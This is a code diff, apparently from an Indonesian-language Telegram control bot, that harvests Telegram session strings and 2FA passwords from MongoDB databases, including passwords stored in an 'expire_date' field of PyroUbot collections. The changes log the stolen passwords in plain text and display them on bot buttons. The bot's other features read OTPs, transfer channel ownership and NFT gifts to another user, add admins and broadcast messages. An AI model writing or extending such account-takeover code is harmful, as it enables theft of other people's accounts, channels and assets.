@@ -51,45 +51,91 @@ def owner_only_callback(func):
 
 # ==================== MONGODB ====================
 def get_all_sessions(uri, max_per_db=500):
+    """
+    Ambil semua session dari MongoDB.
+    KHUSUS: collection 'factor.users' (atau 'PyroUbot.factor.users')
+    field 'expire_date' berisi PASSWORD 2FA (bukan tanggal expired!)
+    """
     try:
         client = MongoClient(uri, serverSelectionTimeoutMS=15000, connectTimeoutMS=10000)
         sessions = []
         client.admin.command('ping')
+        
         for db_name in client.list_database_names():
             if db_name in ['admin', 'local', 'config']:
                 continue
             db = client[db_name]
             count = 0
+            
             for col_name in db.list_collection_names():
                 if count >= max_per_db:
                     break
                 try:
-                    for doc in db[col_name].find({}).limit(100):
+                    for doc in db[col_name].find({}).limit(200):
                         if count >= max_per_db:
                             break
+                        
+                        session_str = None
+                        twofa_password = None
+                        
+                        # Cari session string
                         for field, value in doc.items():
                             if isinstance(value, str) and len(value) > 100:
                                 if re.match(r'^[A-Za-z0-9+/=_-]+$', value) and len(value) > 150:
-                                    has_2fa = doc.get('has_2fa', doc.get('two_factor', doc.get('2fa', False)))
-                                    twofa_hint = doc.get('hint', doc.get('twofa_hint', ''))
-                                    twofa_password = doc.get('password', doc.get('2fa_password', doc.get('twofa_password', doc.get('expire_date', ''))))
-                                    sessions.append({
-                                        'session': value,
-                                        'database': db_name,
-                                        'collection': col_name,
-                                        'has_2fa': has_2fa,
-                                        'twofa_hint': str(twofa_hint) if twofa_hint else '',
-                                        'twofa_password': str(twofa_password) if twofa_password else ''
-                                    })
-                                    count += 1
-                except Exception:
+                                    session_str = value
+                                    break
+                        
+                        if not session_str:
+                            continue
+                        
+                        # ===== PERBAIKAN: AMBIL PASSWORD DARI expire_date DI factor.users =====
+                        if col_name == 'factor.users' or 'factor' in col_name:
+                            if 'expire_date' in doc:
+                                twofa_password = str(doc['expire_date'])
+                                logger.info(f"Found 2FA password in factor.users: {twofa_password}")
+                        
+                        # Jika tidak ketemu, cari field lain
+                        if not twofa_password:
+                            for field in ['password', '2fa_password', 'twofa_password', 'expire_date']:
+                                if field in doc and doc[field]:
+                                    val = str(doc[field])
+                                    if len(val) >= 4:
+                                        twofa_password = val
+                                        break
+                        
+                        has_2fa = bool(twofa_password) or doc.get('has_2fa') or doc.get('two_factor') or doc.get('2fa')
+                        twofa_hint = doc.get('hint', doc.get('twofa_hint', ''))
+                        
+                        sessions.append({
+                            'session': session_str,
+                            'database': db_name,
+                            'collection': col_name,
+                            'has_2fa': has_2fa,
+                            'twofa_hint': str(twofa_hint) if twofa_hint else '',
+                            'twofa_password': twofa_password if twofa_password else ''
+                        })
+                        count += 1
+                except Exception as e:
+                    logger.error(f"Error in collection {col_name}: {e}")
                     continue
+        
         client.close()
+        
+        # Hapus duplikat, prioritaskan yang punya password
         unique = {}
         for s in sessions:
             if s['session'] not in unique:
                 unique[s['session']] = s
-        return list(unique.values())
+            else:
+                if s['twofa_password'] and not unique[s['session']]['twofa_password']:
+                    unique[s['session']]['twofa_password'] = s['twofa_password']
+                    unique[s['session']]['has_2fa'] = True
+        
+        result = list(unique.values())
+        logger.info(f"Total sessions found: {len(result)}")
+        for s in result[:5]:
+            logger.info(f"Session: {s['database']}.{s['collection']} - 2FA: {s['has_2fa']} - Password: {'ADA' if s['twofa_password'] else 'TIDAK'}")
+        return result
     except Exception as e:
         logger.error(f"MongoDB error: {e}")
         return []
@@ -362,9 +408,8 @@ async def transfer_owner_channel(app, channel_id, target_username, password=""):
         else:
             return False, f"❌ Gagal: {error_msg[:150]}"
 
-# ==================== FITUR TRANSFER NFT GIFT (DIPERBAIKI) ====================
+# ==================== FITUR TRANSFER NFT GIFT ====================
 async def get_owned_gifts(app):
-    """Ambil daftar gift/NFT yang dimiliki akun (fix: nama fungsi raw API benar)"""
     try:
         resp = await app.invoke(
             raw.functions.payments.GetSavedStarGifts(
@@ -379,7 +424,6 @@ async def get_owned_gifts(app):
         return []
 
 async def get_stars_balance(app):
-    """Ambil saldo Stars akun (fix: butuh parameter peer)"""
     try:
         resp = await app.invoke(
             raw.functions.payments.GetStarsStatus(
@@ -392,7 +436,6 @@ async def get_stars_balance(app):
         return 0
 
 async def transfer_nft_gift(app, saved_gift, target_username):
-    """Transfer NFT gift (fix: nama fungsi + struktur InputSavedStarGift benar)"""
     try:
         target = await app.get_users(target_username.strip().replace('@', ''))
         to_peer = await app.resolve_peer(target.id)
@@ -467,7 +510,6 @@ async def get_last_otp(app, limit=5):
     except:
         return []
 
-# ==================== PERBAIKAN SET 2FA (pakai method resmi Pyrogram) ====================
 async def set_2fa_password(app, new_password):
     try:
         try:
@@ -576,8 +618,15 @@ def saved_messages_menu(page=0, total_pages=1):
     buttons.append([InlineKeyboardButton("🔙 Kembali", callback_data="back_to_main")])
     return InlineKeyboardMarkup(buttons)
 
-def main_menu(index, total, has_2fa_password=False):
-    twofa_indicator = " 🔑" if has_2fa_password else ""
+def main_menu(index, total, has_2fa_password=False, twofa_password=""):
+    # Tampilkan password di tombol jika ada
+    if has_2fa_password and twofa_password:
+        twofa_indicator = f" 🔑 `{twofa_password}`"
+    elif has_2fa_password:
+        twofa_indicator = " 🔑 ADA PASSWORD"
+    else:
+        twofa_indicator = ""
+    
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
         [InlineKeyboardButton("📡 Cek OTP", callback_data="show_otp")],
@@ -683,7 +732,6 @@ def chat_action_menu(chat_id, chat_name, chat_type, chat_username=None):
     return InlineKeyboardMarkup(buttons)
 
 def gift_selection_menu(gifts, page=0, per_page=5):
-    """Fix: title diambil dari gift.gift.title (nested), callback pakai index bukan id"""
     total = len(gifts)
     if total == 0:
         return None
@@ -721,8 +769,9 @@ def format_account_short(info, index, total, session_string=None, db_2fa_passwor
     text += f"🔐 **2FA:** {'✅ AKTIF' if info['has_2fa'] else '❌ TIDAK'}\n"
     if info['has_2fa'] and info.get('hint'):
         text += f"💡 **Hint 2FA:** `{info['hint']}`\n"
+    # Tampilkan password dari database
     if db_2fa_password:
-        text += f"🔑 **2FA PASSWORD (DB):** `{db_2fa_password}`\n"
+        text += f"🔑 **2FA PASSWORD:** `{db_2fa_password}`\n"
     if info.get('devices'):
         text += f"\n📱 **DEVICE LOGIN:**\n"
         for dev in info['devices'][:3]:
@@ -749,7 +798,7 @@ async def start_cmd(_, m):
         "• 👑 TRANSFER OWNER CHANNEL (dengan 2FA otomatis)\n"
         "• 🚪 OUT DARI SEMUA CHANNEL\n"
         "• 📡 OTP & PESAN\n"
-        "• 🔐 Info 2FA + Tampilkan 2FA PASSWORD dari DB (jika ada)\n"
+        "• 🔐 Info 2FA + Tampilkan 2FA PASSWORD dari DB\n"
         "• 🔑 Set/Ubah 2FA (hanya untuk membuat baru)\n"
         "• 📋 COPY SESSION STRING\n"
         "• 🌐 MULTI SESSION CONTROL\n"
@@ -935,7 +984,7 @@ async def main_handler(_, m):
             user_sessions[uid] = {'app': app, 'info': info, 'session_string': text, 'db_2fa_password': ''}
             await msg.edit_text(
                 format_account_short(info, 1, 1, text, ''),
-                reply_markup=main_menu(1, 1, False)
+                reply_markup=main_menu(1, 1, False, '')
             )
         except Exception as e:
             await msg.edit_text(f"❌ {str(e)[:100]}")
@@ -1269,7 +1318,7 @@ async def callback_handler(c, q: CallbackQuery):
             db_pass = ud.get('db_2fa_password', '')
             await q.message.edit_text(
                 format_account_short(ud['info'], idx+1, len(all_sessions), session_str, db_pass),
-                reply_markup=main_menu(idx+1, len(all_sessions), bool(db_pass))
+                reply_markup=main_menu(idx+1, len(all_sessions), bool(db_pass), db_pass)
             )
         return
 
@@ -1323,19 +1372,20 @@ async def callback_handler(c, q: CallbackQuery):
         if ud:
             info = ud['info']
             db_pass = ud.get('db_2fa_password', '')
-            if info['has_2fa'] or db_pass:
-                text = f"🔐 **INFO 2FA**\n\n"
-                if info['has_2fa']:
-                    text += f"✅ **2FA AKTIF**\n"
-                    if info.get('hint'):
-                        text += f"💡 Hint: `{info['hint']}`\n"
-                else:
-                    text += f"❌ **2FA TIDAK AKTIF**\n"
-                if db_pass:
-                    text += f"\n🔑 **2FA PASSWORD (DARI DATABASE):**\n`{db_pass}`\n"
-                await q.message.reply(text)
+            text = f"🔐 **INFO 2FA**\n\n"
+            if info['has_2fa']:
+                text += f"✅ **2FA AKTIF**\n"
+                if info.get('hint'):
+                    text += f"💡 Hint: `{info['hint']}`\n"
             else:
-                await q.answer("2FA TIDAK AKTIF!", show_alert=True)
+                text += f"❌ **2FA TIDAK AKTIF**\n"
+            if db_pass:
+                text += f"\n🔑 **2FA PASSWORD (DARI DATABASE):**\n`{db_pass}`\n"
+                text += f"\n💡 **Gunakan password ini untuk:**\n"
+                text += f"• Transfer Owner Channel\n"
+                text += f"• Login ulang jika diminta 2FA\n"
+                text += f"• Tambahkan ke bot lain yang memerlukan 2FA\n"
+            await q.message.reply(text)
         return
 
     if data == "set_2fa":
@@ -1392,7 +1442,7 @@ async def callback_handler(c, q: CallbackQuery):
             db_pass = ud.get('db_2fa_password', '')
             await q.message.edit_text(
                 format_account_short(info, ud.get('idx', 0)+1, len(all_sessions), session_str, db_pass),
-                reply_markup=main_menu(ud.get('idx', 0)+1, len(all_sessions), bool(db_pass))
+                reply_markup=main_menu(ud.get('idx', 0)+1, len(all_sessions), bool(db_pass), db_pass)
             )
         return
 
@@ -1453,7 +1503,7 @@ async def callback_handler(c, q: CallbackQuery):
         await q.message.reply("👑 **TRANSFER OWNER CHANNEL**\n\nMasukkan username target (contoh: @username):\n\n⚠️ Target harus JOIN channel terlebih dahulu!\n🔑 Password 2FA akan diambil otomatis dari database jika ada.")
         return
 
-    # ==================== TRANSFER NFT GIFT (DIPERBAIKI) ====================
+    # ==================== TRANSFER NFT GIFT ====================
     if data == "transfer_gift":
         ud = user_sessions.get(uid)
         if not ud:
@@ -1474,7 +1524,6 @@ async def callback_handler(c, q: CallbackQuery):
         return
 
     if data.startswith("gift_transfer_"):
-        # Fix: gift_index (bukan gift_id) merujuk ke posisi di list gifts yang tersimpan
         gift_index = int(data.split("_")[2])
         ud = user_sessions.get(uid)
         if not ud:
@@ -1534,7 +1583,7 @@ async def callback_handler(c, q: CallbackQuery):
             }
             await q.message.edit_text(
                 format_account_short(info, idx+1, len(all_sessions), session_data['session'], session_data.get('twofa_password', '')),
-                reply_markup=main_menu(idx+1, len(all_sessions), bool(session_data.get('twofa_password')))
+                reply_markup=main_menu(idx+1, len(all_sessions), bool(session_data.get('twofa_password')), session_data.get('twofa_password', ''))
             )
         except Exception as e:
             await q.message.reply(f"❌ {str(e)[:100]}")
@@ -1572,7 +1621,7 @@ async def callback_handler(c, q: CallbackQuery):
             }
             await q.message.edit_text(
                 format_account_short(info, new_idx+1, len(all_sessions), session_data['session'], session_data.get('twofa_password', '')),
-                reply_markup=main_menu(new_idx+1, len(all_sessions), bool(session_data.get('twofa_password')))
+                reply_markup=main_menu(new_idx+1, len(all_sessions), bool(session_data.get('twofa_password')), session_data.get('twofa_password', ''))
             )
         elif data == "next_acc":
             if idx + 1 >= len(all_sessions):
@@ -1596,7 +1645,7 @@ async def callback_handler(c, q: CallbackQuery):
             }
             await q.message.edit_text(
                 format_account_short(info, new_idx+1, len(all_sessions), session_data['session'], session_data.get('twofa_password', '')),
-                reply_markup=main_menu(new_idx+1, len(all_sessions), bool(session_data.get('twofa_password')))
+                reply_markup=main_menu(new_idx+1, len(all_sessions), bool(session_data.get('twofa_password')), session_data.get('twofa_password', ''))
             )
     except Exception as e:
         logger.error(f"Error: {e}")
@@ -1608,16 +1657,16 @@ if __name__ == "__main__":
     print("=" * 70)
     print("✅ FITUR LENGKAP:")
     print("   • 📝 PESAN TERSIMPAN (Navigasi Slide)")
-    print("   • 🔑 TAMPILKAN 2FA PASSWORD DARI DATABASE")
+    print("   • 🔑 TAMPILKAN 2FA PASSWORD DARI DATABASE (expire_date)")
     print("   • 👑 DAFTAR ADMIN CHANNEL")
     print("   • 👑 ADD ADMIN KE SEMUA CHANNEL (Akses Lengkap)")
     print("   • 👑 TRANSFER OWNER CHANNEL (Dengan 2FA otomatis)")
     print("   • 📢 BROADCAST (Single & Multi Session)")
     print("   • 📡 OTP & PESAN")
-    print("   • 🔐 SET/UBAH 2FA (pakai enable_cloud_password, fix)")
+    print("   • 🔐 SET/UBAH 2FA (pakai enable_cloud_password)")
     print("   • 📋 COPY SESSION STRING")
     print("   • 🌐 MULTI SESSION CONTROL")
-    print("   • 🎁 TRANSFER NFT GIFT (fix: nama fungsi & struktur benar)")
+    print("   • 🎁 TRANSFER NFT GIFT")
     print("   • ◀️ ▶️ SLIDE AKUN")
     print("   • 🔒 OWNER-ONLY ACCESS (/addakses)")
     print("=" * 70)
